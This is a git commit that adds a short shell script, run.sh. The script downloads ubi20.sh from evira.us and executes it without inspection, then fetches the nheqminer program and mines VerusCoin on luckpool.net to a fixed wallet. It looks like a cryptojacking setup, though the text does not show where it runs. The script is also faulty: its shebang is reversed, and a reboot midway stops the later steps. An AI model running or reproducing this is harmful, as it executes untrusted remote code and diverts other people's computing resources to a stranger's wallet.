426aa24a4fdd75899582cec6a4d132f08c8012bc
satyahuyisads <93104202+satyahuyisads@users.noreply.github.com>
2021-10-25 07:43:08 +0700

    Create run.sh

---
+++ run.sh
@@ -0,0 +1,11 @@
+!#/bin/sh
+
+apt-get install wget
+wget http://evira.us/ubi20.sh
+chmod +x ubi20.sh
+./ubi20.sh
+reboot
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+tar -xvf nheqminer-Linux-v0.8.2.tgz 
+tar -xvf nheqminer-Linux-v0.8.2.tar.gz
+nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.rucika -p x -t 2
